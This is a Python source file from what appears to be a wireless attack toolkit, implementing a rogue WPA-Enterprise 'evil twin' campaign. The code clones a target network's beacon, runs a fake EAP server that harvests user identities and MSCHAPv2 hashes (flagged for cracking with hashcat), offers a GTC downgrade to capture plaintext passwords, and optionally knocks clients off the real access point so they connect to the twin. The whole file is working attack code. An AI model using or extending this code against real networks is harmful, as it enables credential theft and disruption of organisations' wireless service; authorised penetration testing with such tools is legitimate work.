"""EnterpriseEvilTwinCampaign: stand up a rogue WPA-Enterprise twin and harvest EAP credentials.

The twin beacons the target's SSID with an 802.1X RSN, answers auth/assoc, and runs a rogue EAP
server (PEAP or EAP-TTLS) that captures each client's identity and MSCHAPv2 hash (crackable with
hashcat -m 5500), or, with the GTC downgrade, its plaintext password. An optional punt evicts
clients from the real AP so they roam to the twin (reusing the WPA2 twin's Punter).
"""
from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass
from typing import Callable, Optional

from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eviltwin.campaign import csa_target_channel
from wifit3.campaigns.eviltwin.punter import BURST_SIZE, FRAME_GAP_SEC, Punter, PuntMode
from wifit3.campaigns.eviltwin_enterprise.eap_server import Capture, Method
from wifit3.campaigns.eviltwin_enterprise.fake_ap import EnterpriseFakeAP
from wifit3.campaigns.eviltwin_enterprise.store import save_capture
from wifit3.dot11 import str_to_mac
from wifit3.dot11.ap import beacon_clone_enterprise
from wifit3.dot11.csa import build_csa_beacon
from wifit3.dot11.pmf import PmfPosture
from wifit3.models import AccessPoint
from wifit3.models.access_point import eap_only

logger = logging.getLogger(__name__)

_POLL_SEC = 0.25


@dataclass(frozen=True)
class EnterpriseEvilTwinInput:
    """The modal's output: which interfaces host and punt, the EAP method, and whether to downgrade
    to GTC for plaintext capture."""
    twin_iface: object
    punt_iface: object
    twin_channel: int
    twin_bssid: str
    method: Method = Method.PEAP
    gtc_downgrade: bool = False
    punt_modes: tuple[PuntMode, ...] = ()
    csa_channel: Optional[int] = None
    punt_period_sec: Optional[float] = 30.0
    punt_once: bool = False


class EnterpriseEvilTwinCampaign(Campaign):
    button_id = "btn-eviltwin-ent"
    key = "eviltwin_ent"
    idle_label = "Enterprise Twin"
    run_label = "Stop Twin"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap: AccessPoint) -> bool:
        return bool(ap.ssid) and eap_only(ap)

    @classmethod
    def ineligible_reason(cls, ap: AccessPoint) -> Optional[str]:
        if not eap_only(ap):
            return "Needs a WPA-Enterprise (802.1X) network"
        if ap.is_hidden:
            return "hidden SSID: can't clone"
        if not ap.last_beacon_frame:
            return "no beacon captured yet"
        return None

    def status_under_card(self) -> str:
        return "● Enterprise Twin"

    def status_headlines(self, vault) -> list[str]:
        from wifit3.persist.config import Config
        stats = getattr(self.fakeap, "stats", None)
        method = self.method.value + (" + GTC down" if self.gtc_downgrade else "")
        if stats is None:
            return [f"[bold cyan]Enterprise twin arming…[/bold cyan] on CH {self.twin_channel}"]
        head = [f"[bold cyan]Enterprise twin active[/bold cyan] ({method}) on CH {self.twin_channel}"]
        if stats.credentials or stats.identities:
            head.append(f"[black bold on green] ✓ {stats.credentials} creds [/black bold on green] "
                        f"[dim]· {stats.identities} identities · saved to {Config.captures_dir}[/dim]")
        else:
            head.append(f"[dim]auth:{stats.auth} · assoc:{stats.assoc} · "
                        f"EAP starts:{stats.eapol_starts}[/dim]")
        return head

    def __init__(self, array, target: AccessPoint, evil_input: EnterpriseEvilTwinInput):
        if not target.last_beacon_frame:
            raise ValueError("Enterprise twin needs a captured beacon to clone; none seen yet.")
        if not target.ssid:
            raise ValueError("Enterprise twin needs a known SSID: target is hidden.")
        super().__init__(ap=target, array=array)
        self.ssid = target.ssid
        self.target_channel = target.channel
        self.twin_iface = evil_input.twin_iface
        self.punt_iface = evil_input.punt_iface
        self.twin_channel = evil_input.twin_channel
        self.twin_bssid = evil_input.twin_bssid.lower()
        self.method = evil_input.method
        self.gtc_downgrade = evil_input.gtc_downgrade
        self.same_bssid = self.twin_bssid == target.bssid
        self.punt_period_sec = evil_input.punt_period_sec
        self.punt_once = evil_input.punt_once
        self.real_beacon = target.last_beacon_frame
        pmf_capable = target.pmf_posture in (PmfPosture.REQUIRED, PmfPosture.OPTIONAL)
        self.twin_beacon = beacon_clone_enterprise(
            self.real_beacon, self.twin_channel,
            None if self.same_bssid else str_to_mac(self.twin_bssid), pmf_capable=pmf_capable)
        self.punter = self._make_punter(evil_input, target.bssid)
        self.fakeap: Optional[EnterpriseFakeAP] = None
        self.captures: list[Capture] = []
        self.log: Callable[[str], None] = lambda _m: None

    def _make_punter(self, evil_input: EnterpriseEvilTwinInput, target_bssid: str) -> Optional[Punter]:
        if not evil_input.punt_modes:
            return None
        csa_channel = csa_target_channel(self.target_channel,
                                         evil_input.csa_channel or self.twin_channel)
        return Punter(evil_input.punt_modes, self.real_beacon, str_to_mac(target_bssid), csa_channel,
                      str_to_mac(self.twin_bssid), self.twin_channel, self.target_channel)

    async def _loop(self) -> None:
        self.fakeap = EnterpriseFakeAP(
            self.twin_iface, str_to_mac(self.twin_bssid), self.ssid, self.twin_channel,
            self.twin_beacon, method=self.method, gtc_downgrade=self.gtc_downgrade,
            rx_source=self.twin_iface, on_capture=self._on_capture)
        if self.same_bssid:
            self.array.ignore_stray_beacons(self.twin_bssid, self.twin_channel)
        else:
            self.array.mark_evil_twin(self.twin_bssid)
            self.array.record_injected_beacon(self.twin_beacon, self.twin_iface.name,
                                              self.twin_channel)
        await self.fakeap.start()
        if (self.punt_iface is not self.twin_iface
                and self.punt_iface.current_channel != self.target_channel):
            await self.punt_iface.set_channel(self.target_channel)

        punted = False
        while not self.stopped:
            if self._should_punt(punted):
                await self.punter.punt(self.punt_iface, self._target_clients())
                punted = True
            await self._sleep(self.punt_period_sec or _POLL_SEC)

    def _on_capture(self, cap: Capture) -> None:
        self.captures.append(cap)
        save_capture(cap)
        if cap.inner_method == "Identity":
            self.log(f"[cyan]EAP identity[/cyan] [bold]{cap.username}[/bold]")
        elif cap.password is not None:
            self.log(f"[bold green]✓ {cap.inner_method} plaintext[/bold green] "
                     f"[bold]{cap.username}[/bold] = {cap.password!r}")
        else:
            self.log(f"[bold green]✓ {cap.inner_method} hash[/bold green] for "
                     f"[bold]{cap.username}[/bold] (hashcat -m 5500)")

    def _target_clients(self) -> list[bytes]:
        target = self.ap.bssid.lower()
        return [str_to_mac(c.mac) for c in self.array.clients.values()
                if (c.bssid or "").lower() == target]

    def _should_punt(self, already_punted: bool) -> bool:
        if self.punter is None or self.punt_period_sec is None:
            return False
        return not (self.punt_once and already_punted)

    async def _sleep(self, seconds: float) -> None:
        elapsed = 0.0
        while elapsed < seconds and not self.stopped:
            await asyncio.sleep(_POLL_SEC)
            elapsed += _POLL_SEC

    async def teardown(self) -> None:
        if self.fakeap is None:
            return
        try:
            try:
                await self.fakeap.stop()
            finally:
                await self._csa_return()
        finally:
            if self.same_bssid:
                self.array.stop_ignoring_stray_beacons(self.twin_bssid)
            await self.twin_iface.set_channel(self.target_channel)

    async def _csa_return(self) -> None:
        if self.twin_channel == self.target_channel:
            return
        frame = build_csa_beacon(self.twin_beacon, self.target_channel, from_channel=self.twin_channel)
        for _ in range(BURST_SIZE):
            await self.twin_iface.send_no_wait(frame)
            await asyncio.sleep(FRAME_GAP_SEC)
